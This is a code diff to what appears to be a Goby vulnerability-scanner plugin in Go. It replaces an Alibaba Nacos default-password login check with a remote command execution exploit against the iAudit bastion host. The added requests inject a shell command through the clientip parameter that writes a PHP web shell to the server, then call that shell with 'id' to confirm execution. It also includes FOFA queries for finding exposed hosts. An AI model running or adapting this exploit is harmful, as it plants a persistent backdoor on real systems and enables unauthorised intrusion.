@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "Alibaba Nacos 默认密码",
+  "Name": "中远麒麟 iAudit堡垒机 get_luser_by_sshport.php 远程命令执行漏洞",
   "Description": "",
-  "Product": "Nacos",
+  "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "title=\"Nacos\"",
-  "GobyQuery": "title=\"Nacos\"",
+  "FofaQuery": "cert.subject=\"Baolei\"",
+  "GobyQuery": "cert.subject=\"Baolei\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -29,17 +29,12 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "POST",
-        "uri": "/nacos/v1/auth/users/login",
+        "method": "GET",
+        "uri": "/get_luser_by_sshport.php?clientip=1;echo+%27%3C?php%20var_dump(shell_exec($_GET[cmd]));?%3E%27%3E/opt/freesvr/web/htdocs/freesvr/audit/test.php;&clientport=1",
         "follow_redirect": true,
-        "header": {
-          "Accept": "application/json, text/plain, */*",
-          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-          "Accept-Encoding": "gzip, deflate",
-          "Content-Type": "application/x-www-form-urlencoded"
-        },
+        "header": {},
         "data_type": "text",
-        "data": "username=nacos&password=nacos"
+        "data": ""
       },
       "ResponseTest": {
         "type": "group",
@@ -56,7 +51,38 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "accessToken",
+            "value": "",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/test.php?cmd=id",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "uid=",
             "bz": ""
           }
         ]
@@ -112,8 +138,8 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "Alibaba Nacos 默认密码",
-      "Product": "Nacos",
+      "Name": "中远麒麟 iAudit堡垒机 get_luser_by_sshport.php 远程命令执行漏洞",
+      "Product": "",
       "Description": "",
       "Recommendation": "",
       "Impact": "",
@@ -121,7 +147,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "Alibaba Nacos Default password",
+      "Name": "iAudit rce",
       "Product": "",
       "Description": "",
       "Recommendation": "",
